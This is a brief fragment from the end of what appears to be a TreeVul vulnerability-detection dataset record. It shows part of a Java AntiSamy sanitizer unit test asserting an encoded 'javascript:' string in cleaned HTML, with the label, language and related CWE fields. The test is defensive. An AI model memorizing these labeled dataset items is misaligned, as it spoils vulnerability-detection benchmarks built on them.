revised, AntiSamy.SAX).getCleanHTML(),\n                containsString(\"javascript&amp;#00058\"));\n    }\n}\n\n",
    "target": 0,
    "language": "java",
    "dataset": "TreeVul",
    "idx": 700291,
    "RELATED_CWE": [
      "CWE-352",
      "CWE-601",
      "CWE-918"
    ]
  }
]